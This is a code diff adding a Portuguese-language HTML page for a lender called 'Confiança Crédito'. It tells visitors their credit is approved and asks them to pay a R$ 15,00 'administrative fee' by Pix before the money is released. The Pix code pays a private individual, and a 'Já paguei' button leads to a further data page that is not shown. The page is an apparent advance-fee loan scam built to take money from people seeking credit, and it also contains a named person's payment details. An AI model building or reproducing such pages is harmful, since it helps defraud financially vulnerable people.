@@ -1,0 +1,94 @@
+<!DOCTYPE html><html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Pagamento Pix | Confiança Crédito</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root{
+      --bg:#0f0f0f;--card:#181818;--pink:#ff0050;--cyan:#00f2ea;--ok:#21d07a;--text:#fff;--muted:#bdbdbd;
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0;min-height:100vh;background:linear-gradient(135deg,#000 40%,#111);
+      font-family:'Poppins',sans-serif;color:var(--text);
+      display:flex;align-items:center;justify-content:center;padding:16px;
+    }
+    .container{width:100%;max-width:560px}
+    .card{
+      background:var(--card);border-radius:24px;padding:24px;
+      box-shadow:0 22px 55px rgba(0,0,0,.6);border:1px solid rgba(255,255,255,.06);
+    }
+    .brand{display:flex;align-items:center;gap:10px;margin-bottom:8px}
+    .logo{width:42px;height:42px;border-radius:14px;background:linear-gradient(135deg,var(--pink),var(--cyan));display:grid;place-items:center;color:#000;font-weight:900}
+    h1{font-size:clamp(1.3rem,5vw,1.7rem);margin:12px 0 6px}
+    p{margin:0 0 14px;color:var(--muted);font-size:.95rem}
+    .amount{background:#202020;border-radius:16px;padding:14px;text-align:center;margin:12px 0}
+    .amount strong{font-size:1.8rem;color:var(--ok)}
+    .pix-box{background:#202020;border-radius:16px;padding:14px;border:1px solid rgba(255,255,255,.06)}
+    textarea{
+      width:100%;min-height:140px;resize:none;border-radius:12px;
+      border:1px solid rgba(255,255,255,.12);background:#111;color:#fff;
+      padding:12px;font-size:.85rem
+    }
+    .actions{display:grid;grid-template-columns:1fr;gap:10px;margin-top:12px}
+    .btn{
+      padding:14px;border-radius:16px;border:none;cursor:pointer;
+      background:linear-gradient(90deg,var(--pink),var(--cyan));color:#000;font-weight:900;font-size:1rem
+    }
+    .btn.secondary{background:#2a2a2a;color:#fff;border:1px solid rgba(255,255,255,.12)}
+    .status{display:none;margin-top:10px;font-size:.85rem;color:var(--ok);text-align:center}
+    .tips{margin-top:14px;display:grid;grid-template-columns:1fr;gap:8px;font-size:.8rem;color:#bdbdbd}
+    .tips div{background:#202020;border-radius:12px;padding:10px;text-align:center}
+    .note{margin-top:14px;font-size:.7rem;color:#9e9e9e;text-align:center}
+    @media(min-width:480px){.card{padding:28px}}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <div class="brand">
+        <div class="logo">CC</div>
+        <strong>Confiança Crédito</strong>
+      </div>
+      <h1>Pagamento via Pix</h1>
+      <p>Seu crédito já foi <strong>aprovado</strong>. Para realizar a <strong>liberação do valor</strong>, efetue o pagamento da taxa administrativa abaixo.</p><div class="amount">
+    <div>Valor</div>
+    <strong>R$ 15,00</strong>
+  </div>
+
+  <div class="pix-box">
+    <label style="font-size:.8rem;font-weight:700;color:#d7d7d7">Código Pix (Copia e Cola)</label>
+    <textarea id="pixCode" readonly>00020126590014br.gov.bcb.pix0114+55949841627880219taxa administrativa520400005303986540515.005802BR5923MATHEUS DA SILVA DA LUZ6009Sao Paulo62290525REC6940A9F9BA7461025687486304EF25</textarea>
+    <div class="actions">
+      <button class="btn" onclick="copyPix()">Copiar código Pix</button>
+      <a href="dados-pix.html" class="btn secondary" style="text-decoration:none;text-align:center">Já paguei</a>
+    </div>
+    <div id="status" class="status">✔ Código copiado com sucesso</div>
+  </div>
+
+  <div class="tips">
+    <div>📱 Abra o app do seu banco</div>
+    <div>📋 Cole o código Pix</div>
+    <div>⚡ Confirme o pagamento</div>
+  </div>
+
+  <div class="note">
+    *Após a confirmação do pagamento, o valor aprovado é <strong>liberado em até 30 minutos</strong>, conforme políticas internas e horários bancários.
+  </div>
+</div>
+
+  </div>  <script>
+    function copyPix(){
+      const el = document.getElementById('pixCode');
+      el.select();
+      el.setSelectionRange(0, 99999);
+      document.execCommand('copy');
+      const st = document.getElementById('status');
+      st.style.display = 'block';
+      setTimeout(()=>st.style.display='none', 2500);
+    }
+  </script></body>
+</html>
